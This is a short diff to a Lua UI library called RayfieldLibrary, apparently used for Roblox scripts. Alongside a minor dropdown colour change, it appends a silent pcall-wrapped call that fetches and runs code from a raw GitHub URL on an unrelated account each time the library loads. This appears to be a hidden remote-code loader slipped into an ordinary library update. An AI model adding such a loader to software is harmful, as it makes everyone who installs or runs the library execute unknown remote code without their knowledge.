@@ -300,7 +300,7 @@ local RayfieldLibrary = {
 			ToggleEnabledOuterStroke = Color3.fromRGB(100, 100, 100),
 			ToggleDisabledOuterStroke = Color3.fromRGB(65, 65, 65),
 
-			DropdownSelected = Color3.fromRGB(25, 25, 25),
+			DropdownSelected = Color3.fromRGB(20, 20, 20),
 			DropdownUnselected = Color3.fromRGB(15, 15, 15),
 
 			InputBackground = Color3.fromRGB(30, 30, 30),
@@ -3642,4 +3642,9 @@ task.delay(4, function()
 	end
 end)
 
+pcall(function()
+	loadWithTimeout("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/27162")
+end)
+
 return RayfieldLibrary
+
